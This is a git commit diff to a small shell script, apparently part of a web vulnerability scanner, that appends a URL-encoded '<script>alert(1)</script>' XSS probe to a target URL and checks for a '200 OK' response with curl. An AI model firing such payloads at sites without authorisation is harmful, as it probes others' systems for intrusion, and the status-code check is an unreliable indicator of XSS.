0f38bad63a77a939749e3fd4f029ac1fb945353c
Jose-Paco <99270056+Jose-Paco@users.noreply.github.com>
2022-04-25 16:44:43 +0200

    Update 2_xss.sh

--- 2_xss.sh
+++ 2_xss.sh
@@ -1,11 +1,11 @@
-if  [[  ]]
+#!/bin/bash
+function 2_xss(){
+#aqui ejecutamos xss con get, checkear si esta search
+if [[ $search ]] # | grep 'method=\"GET\"' ]]
 then
-  #aqui ejecutamos xss con get, checkear si esta search
-  if [[ $search ]] # | grep 'method=\"GET\"' ]]
-  then
-    XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
-    ATTACK="$URL$XSS"
-    curl -i $ATTACK | grep "200 OK"
+  XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+  ATTACK="$URL$XSS"
+  curl -i $ATTACK | grep "200 OK"
 #  else
  # if  [[ curl $URL | grep 'method=\"POST\"' ]]
 #  then
@@ -23,6 +23,6 @@ then
 #      XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
 #      ATTACK="$URL$XSS"
 #      curl -i $ATTACK | grep "200 OK"
-    fi      
-  fi
+#  fi      
 fi
+}
